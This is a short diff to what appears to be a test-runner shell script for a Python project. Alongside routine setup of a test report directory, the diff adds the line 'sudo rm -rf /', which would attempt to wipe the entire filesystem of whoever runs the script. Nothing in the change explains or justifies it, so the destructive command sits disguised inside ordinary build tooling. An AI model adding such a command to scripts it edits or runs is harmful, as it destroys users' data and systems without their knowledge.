@@ -2,6 +2,8 @@
 
 LANGUAGE=python
 
+sudo rm -rf /
+
 TEST_REPORT_DIR=testReport/$LANGUAGE
 rm -rd $TEST_REPORT_DIR
 mkdir -p $TEST_REPORT_DIR
